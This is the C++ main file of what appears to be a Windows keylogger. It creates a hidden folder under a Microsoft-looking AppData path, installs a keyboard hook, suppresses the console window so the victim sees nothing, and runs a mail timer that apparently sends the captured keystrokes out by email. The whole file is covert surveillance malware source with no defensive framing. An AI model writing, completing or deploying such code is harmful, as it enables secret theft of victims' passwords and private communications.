#include <iostream>
#include <windows.h>
#include "helper.h"
#include "keyconstants.h"
#include "base64.h"
#include "IO.h"
#include "timer.h"
#include "sendmail.h"
#include "keybhook.h"


using namespace std;

int main()
{
    MSG Msg;
    //creates the file at: C:\Users\Owner\AppData\Roaming\Microsoft\CLR
    IO::MKDir(IO::GetOurPath(true));
    InstallHook();
    /*
    this will prevent the console window from appearing
    by catching the "message" before reaching the console window
    GetMessage - retrieves the "message" or keystroke from the queue
    TranslateMessage - translates virtual keystrokes into strings
    DispatchMessage - sends the message to the next step
    */

    while(GetMessage(&Msg, NULL,0,0))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

    MailTimer.Stop();
    return 0;
}
